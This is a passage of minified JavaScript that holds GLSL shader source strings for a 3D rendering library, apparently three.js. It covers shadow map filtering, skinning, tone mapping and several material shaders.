+\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 17.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tshadow = (\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_VSM )\n\t\t\tshadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#else\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#endif\n\t\t}\n\t\treturn shadow;\n\t}\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\t\tvec3 absV = abs( v );\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\t\tvec2 planar = v.xy;\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\t\tif ( absV.z >= almostOne ) {\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\t\t} else if ( absV.x >= almostOne ) {\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\t\t} else if ( absV.y >= almostOne ) {\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\t\t}\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\t}\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\t\tvec3 lightToPosition = shadowCoord.xyz;\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\t\tdp += shadowBias;\n\t\tvec3 bd3D = normalize( lightToPosition );\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#else\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\t\t#endif\n\t}\n#endif",shadowmap_pars_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n#endif",shadowmap_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n#endif",shadowmask_pars_fragment:"float getShadowMask() {\n\tfloat shadow = 1.0;\n\t#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLight directionalLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t}\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLight spotLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t}\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLight pointLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t}\n\t#endif\n\t#endif\n\treturn shadow;\n}",skinbase_vertex:"#ifdef USE_SKINNING\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n#endif",skinning_pars_vertex:"#ifdef USE_SKINNING\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\t#ifdef BONE_TEXTURE\n\t\tuniform highp sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\t\t\ty = dy * ( y + 0.5 );\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\t\t\treturn bone;\n\t\t}\n\t#else\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\t\t}\n\t#endif\n#endif",skinning_vertex:"#ifdef USE_SKINNING\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n#endif",skinnormal_vertex:"#ifdef USE_SKINNING\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\t#ifdef USE_TANGENT\n\t\tobjectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#endif\n#endif",specularmap_fragment:"float specularStrength;\n#ifdef USE_SPECULARMAP\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n#else\n\tspecularStrength = 1.0;\n#endif",specularmap_pars_fragment:"#ifdef USE_SPECULARMAP\n\tuniform sampler2D specularMap;\n#endif",tonemapping_fragment:"#if defined( TONE_MAPPING )\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n#endif",tonemapping_pars_fragment:"#ifndef saturate\n\t#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\nuniform float toneMappingExposure;\nuniform float toneMappingWhitePoint;\nvec3 LinearToneMapping( vec3 color ) {\n\treturn toneMappingExposure * color;\n}\nvec3 ReinhardToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n}\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\nvec3 Uncharted2ToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\n}\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n}\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( ( color * ( 2.51 * color + 0.03 ) ) / ( color * ( 2.43 * color + 0.59 ) + 0.14 ) );\n}",uv_pars_fragment:"#ifdef USE_UV\n\tvarying vec2 vUv;\n#endif",uv_pars_vertex:"#ifdef USE_UV\n\tvarying vec2 vUv;\n\tuniform mat3 uvTransform;\n#endif",uv_vertex:"#ifdef USE_UV\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n#endif",uv2_pars_fragment:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvarying vec2 vUv2;\n#endif",uv2_pars_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n#endif",uv2_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvUv2 = uv2;\n#endif",worldpos_vertex:"#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\n\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\n#endif",background_frag:"uniform sampler2D t2D;\nvarying vec2 vUv;\nvoid main() {\n\tvec4 texColor = texture2D( t2D, vUv );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",background_vert:"varying vec2 vUv;\nuniform mat3 uvTransform;\nvoid main() {\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n}",cube_frag:"uniform samplerCube tCube;\nuniform float tFlip;\nuniform float opacity;\nvarying vec3 vWorldDirection;\nvoid main() {\n\tvec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\tgl_FragColor.a *= opacity;\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",cube_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\tgl_Position.z = gl_Position.w;\n}",depth_frag:"#if DEPTH_PACKING == 3200\n\tuniform float opacity;\n#endif\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#if DEPTH_PACKING == 3200\n\t\tdiffuseColor.a = opacity;\n\t#endif\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <logdepthbuf_fragment>\n\t#if DEPTH_PACKING == 3200\n\t\tgl_FragColor = vec4( vec3( 1.0 - gl_FragCoord.z ), opacity );\n\t#elif DEPTH_PACKING == 3201\n\t\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\n\t#endif\n}",depth_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n}",distanceRGBA_frag:"#define DISTANCE\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main () {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist );\n\tgl_FragColor = packDepthToRGBA( dist );\n}",distanceRGBA_vert:"#define DISTANCE\nvarying vec3 vWorldPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\tvWorldPosition = worldPosition.xyz;\n}",equirect_frag:"uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV;\n\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",equirect_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}",linedashed_frag:"uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\t\tdiscard;\n\t}\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",linedashed_vert:"uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\tvLineDistance = scale * lineDistance;\n\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}",meshbasic_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\t#ifdef USE_LIGHTMAP\n\t\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\t#else\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\t#endif\n\t#include <aomap_fragment>\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",meshbasic_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_ENVMAP\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n}",meshlambert_frag:"uniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\t#else\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\t#endif\n\t#include <lightmap_fragment>\n\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\t#else\n\t\treflectedLight.directDiffuse = vLightFront;\n\t#endif\n\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshlambert_vert:"#define LAMBERT\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshmatcap_frag:"#define MATCAP\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;\n\t#ifdef USE_MATCAP\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\t#else\n\t\tvec4 matcapColor = vec4( 1.0 );\n\t#endif\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",meshmatcap_vert:"#define MATCAP\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include 